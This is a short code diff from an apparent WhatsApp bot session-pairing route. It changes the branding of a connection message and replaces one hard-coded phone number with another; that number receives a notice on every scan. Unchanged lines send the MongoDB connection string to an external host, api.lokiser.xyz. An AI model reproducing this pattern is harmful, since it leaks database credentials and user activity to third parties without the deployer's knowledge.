@@ -58,9 +58,9 @@ router.get('/', async (req, res) => {
                     const userCountResponse = await axios.post('https://api.lokiser.xyz/mongoose/session/count', { mongoUrl: MONGODB_URL });
                     const userCount = userCountResponse.data.count;
                 
-                    await session.sendMessage(session.user.id, { text: `\n *ASTRO Successfully Connected*\n\n *Total Scan :* ${userCount}` });
+                    await session.sendMessage(session.user.id, { text: `\n * Successfully Connected*\n\n *Total Scan :* ${userCount}` });
                     await session.sendMessage(session.user.id, { text: data.data });
-                    await session.sendMessage("919846272202@s.whatsapp.net", { text: "*Successfully Scanned Black-Astro-Md*🌚" });
+                    await session.sendMessage("917994489493@s.whatsapp.net", { text: "*Successfully Scanned Izumi-pair*" });
 
                     await delay(100);
                     await session.ws.close();
